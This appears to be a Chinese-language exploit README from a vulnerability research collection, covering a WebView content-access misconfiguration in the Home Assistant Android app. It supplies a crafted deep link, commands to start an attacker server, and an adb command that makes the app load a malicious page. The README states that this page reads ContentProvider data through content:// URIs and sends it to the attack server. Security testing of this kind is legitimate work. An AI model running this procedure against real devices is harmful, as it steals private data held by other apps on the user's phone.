# EXP: 2.1.2 Content Access Misconfiguration

## 漏洞概述

WebView 启用了 `allowContentAccess`，允许网页通过 `content://` 协议访问其他应用的 ContentProvider 暴露的数据。

## 触发方式

```
homeassistant://webview?url=http://10.0.2.2:8000/exp/2.1.2
```

## 启动服务

```bash
cd exp/home-assistant/2.1.2_Content_Access_Misconfiguration
python server.py
```

## 验证步骤

```bash
python server.py
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/2.1.2"
dir received\
```

## 预期结果

恶意页面通过 `content://` 协议尝试读取系统 ContentProvider 数据，回传至攻击服务器。
